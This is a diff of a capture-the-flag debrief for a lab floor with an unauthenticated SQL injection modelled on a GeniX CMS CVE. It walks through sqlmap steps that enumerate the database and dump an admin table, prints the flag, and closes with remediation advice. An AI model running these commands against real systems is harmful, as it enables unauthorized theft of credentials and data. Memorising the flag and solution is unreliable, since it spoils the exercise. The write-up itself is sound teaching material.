@@ -1,11 +1,11 @@
-# A Sealed Floor — Debrief
+# A Sealed Floor, Debrief
 
 **Node:** `p2_2` &middot; **Flag:** `SEIYAKU{an_old_forgotten_door}` &middot; **Route:** `GET /p2/sealed` &middot; **Sink:** `challenges/phase2.py`, `mariadb` (`cms_news` table, `cms_admin` table)
 
 ## Root cause
 
 The bulletin-board lookup builds its query with raw f-string
-concatenation — the same sink shape as every other floor in this lab —
+concatenation, the same sink shape as every other floor in this lab,
 against a bare, unquoted numeric `id`:
 
 ```python
@@ -15,18 +15,18 @@ cur.execute(q)
 rows = cur.fetchall()
 ```
 
-Nothing here is a new *technique* over the last floor (`p2_1`) — it's
+Nothing here is a new *technique* over the last floor (`p2_1`), it's
 the same unquoted-numeric shape, still reachable with boolean-blind,
 error-based, time-based, and UNION-based payloads all through the one
 `id` parameter. What's different is the *context*: this isn't a floor
 built to teach the sqlmap workflow from scratch. It's a stand-in for a
-whole real-world category of bug — an old, unauthenticated
+whole real-world category of bug, an old, unauthenticated
 content-management module, addressed by a `page` selector plus a record
 `id` in the URL, that was written before parameterized queries were the
 obvious default and never revisited once they were.
 
-`cms_admin` — the module's old admin login, carried over unrotated from
-whatever install first stood this module up — is never touched by any
+`cms_admin`, the module's old admin login, carried over unrotated from
+whatever install first stood this module up, is never touched by any
 query `/p2/sealed` constructs on its own. It only surfaces by riding the
 `id` injection into a UNION SELECT / subquery against it, exactly like
 `vault_floors` in the last floor.
@@ -36,7 +36,7 @@ query `/p2/sealed` constructs on its own. It only surfaces by riding the
 A CVE (Common Vulnerabilities and Exposures) entry is a public,
 uniquely-numbered record that says, in effect: *this specific software,
 at this version, has this class of flaw, and here's roughly how it's
-triggered.* It's an advisory, not a walkthrough — CVE records typically
+triggered.* It's an advisory, not a walkthrough, CVE records typically
 describe the vulnerable component and parameter, sometimes a proof-of-
 concept request, but rarely a fully weaponized exploit. Turning a CVE
 into a working payload against a real target is exactly the skill this
@@ -46,10 +46,10 @@ bug is, then go confirm it exists and see what it actually yields.
 This floor is modeled on the real-world pattern behind
 **CVE-2015-3933** (GeniX CMS): a legacy content-management system with
 an unauthenticated, GET-parameter-driven SQL injection in one of its
-content-lookup pages — the classic "old CMS module, numeric `id` in the
+content-lookup pages, the classic "old CMS module, numeric `id` in the
 URL, never parameterized" shape. This lab doesn't reproduce GeniX CMS's
 original PHP source (this app is Python/Flask, not PHP, and the actual
-vulnerable file/parameter names differ) — what it reproduces is the
+vulnerable file/parameter names differ), what it reproduces is the
 *pattern* the CVE describes: a dated, page-plus-id URL structure,
 pre-auth, string-built SQL, sitting in a module nobody has had a reason
 to open in years. Reading an advisory like this one is a skill in
@@ -59,7 +59,7 @@ original code in front of you.
 
 ## The walk: mapping the pattern to a payload
 
-Same sqlmap workflow as `p2_1` — request, confirm, enumerate, dump —
+Same sqlmap workflow as `p2_1`, request, confirm, enumerate, dump,
 against a target that *looks* different (an old bulletin board instead
 of a modern floor catalog) but is the identical bug underneath. This is
 deliberately the point: once you recognize the pattern, the tooling
@@ -79,7 +79,7 @@ Connection: close
 (this is exactly what `solvers/p2_2.sh` writes to a temp file before
 calling sqlmap.)
 
-### Step 1 — confirm the injection
+### Step 1, confirm the injection
 
 ```
 sqlmap -r req.txt -p id --batch --ignore-stdin -v 1
@@ -131,11 +131,11 @@ back-end DBMS: MySQL >= 5.1 (MariaDB fork)
 ```
 
 (Real, live run against this exact seed. Note the `page=news&id=...`
-payloads in the transcript — sqlmap is injecting into `id` while
+payloads in the transcript, sqlmap is injecting into `id` while
 carrying `page=news` along for the ride, since both are GET params on
 the same request.)
 
-### Step 2 — enumerate databases
+### Step 2, enumerate databases
 
 ```
 sqlmap -r req.txt -p id --batch --ignore-stdin --dbs
@@ -147,7 +147,7 @@ available databases [2]:
 [*] seiyaku
 ```
 
-### Step 3 — enumerate tables in `seiyaku`
+### Step 3, enumerate tables in `seiyaku`
 
 ```
 sqlmap -r req.txt -p id --batch --ignore-stdin -D seiyaku --tables
@@ -173,12 +173,12 @@ Database: seiyaku
 +--------------+
 ```
 
-`cms_news` and `cms_pages` back this floor's own display pages —
+`cms_news` and `cms_pages` back this floor's own display pages,
 `cms_admin` is the one name this route's own code never selects from or
 joins against. Everything else here belongs to earlier floors across
 the exam.
 
-### Step 4 — enumerate columns of `cms_admin`
+### Step 4, enumerate columns of `cms_admin`
 
 ```
 sqlmap -r req.txt -p id --batch --ignore-stdin -D seiyaku -T cms_admin --columns
@@ -197,7 +197,7 @@ Table: cms_admin
 +---------------+--------------+
 ```
 
-### Step 5 — dump it
+### Step 5, dump it
 
 ```
 sqlmap -r req.txt -p id --batch --ignore-stdin --dump -T cms_admin
@@ -218,19 +218,19 @@ Table: cms_admin
 +----+----------+--------------------------------+
 ```
 
-(This is a real, live run against this exact stack — not a hypothetical
-transcript — and is exactly the command `solvers/p2_2.sh` runs.)
+(This is a real, live run against this exact stack, not a hypothetical
+transcript, and is exactly the command `solvers/p2_2.sh` runs.)
 
 ## Why "old, forgotten code rots"
 
 This floor's entire premise is that the vulnerability isn't new, clever,
-or hidden behind some elaborate trick — it's *old*. Software that stops
+or hidden behind some elaborate trick, it's *old*. Software that stops
 receiving attention doesn't become safer by sitting still; the rest of
 the world keeps moving. Query-building conventions that were once
 unremarkable ("just concatenate the id, it's a number") become known-bad
 practice. Frameworks patch their defaults. Security research catches up
 and publishes CVEs against the specific products that never got the
-memo. Meanwhile the module itself — like this bulletin board — keeps
+memo. Meanwhile the module itself, like this bulletin board, keeps
 running, unauthenticated, answering requests exactly the way it did the
 day it was deployed, because nobody had a reason to open it again once
 it stopped mattering to anyone's day-to-day.
@@ -241,12 +241,12 @@ running the same old code, with a documented way in." An attacker
 doesn't need to discover a new bug when an old one, in a component
 nobody retired, is a public, searchable fact. The uncomfortable
 corollary for defenders is that "we haven't touched that module in
-years" is not the same claim as "that module is safe" — it's often the
+years" is not the same claim as "that module is safe", it's often the
 opposite.
 
 ## HxH analogy
 
-Trick Tower's floors are usually described as puzzles built by design —
+Trick Tower's floors are usually described as puzzles built by design,
 rules laid out on purpose, for applicants to solve on purpose. This
 floor isn't one of those. It's a floor the tower's current staff didn't
 build, don't maintain, and mostly don't remember exists: a leftover from
@@ -258,7 +258,7 @@ danger that accumulates in anything old enough to be forgotten about.
 
 ## Remediation
 
-- **Parameterized queries, always** — identical fix to every floor in
+- **Parameterized queries, always**, identical fix to every floor in
   this lab:
 
   ```python
@@ -268,19 +268,19 @@ danger that accumulates in anything old enough to be forgotten about.
   )
   ```
 
-- **Patch and upgrade unmaintained dependencies — or retire them.** The
+- **Patch and upgrade unmaintained dependencies, or retire them.** The
   real lesson this floor stands in for: an old CMS module (or library,
   or plugin, or vendored dependency) that nobody has updated is not
   neutral risk, it's accumulating risk. If a component has a public CVE
   and no maintained upgrade path, the two real options are patching it
   (backport the fix, or replace the vulnerable code path directly) or
-  decommissioning it outright — "leave it running because nobody uses
+  decommissioning it outright, "leave it running because nobody uses
   it anymore" is exactly the state this floor is built to exploit,
   because "nobody uses it" and "nothing can reach it" are not the same
   claim.
 - **Track what's actually deployed.** You can't patch a known CVE in a
-  component you've forgotten is running. An asset/dependency inventory
-  — even an informal one — is what turns "there's a public advisory
+  component you've forgotten is running. An asset/dependency inventory,
+  even an informal one, is what turns "there's a public advisory
   against X" into "we know we're running X, and we know where."
   Without it, a public CVE against a component sitting quietly in
   production is a door nobody remembered leaving open.
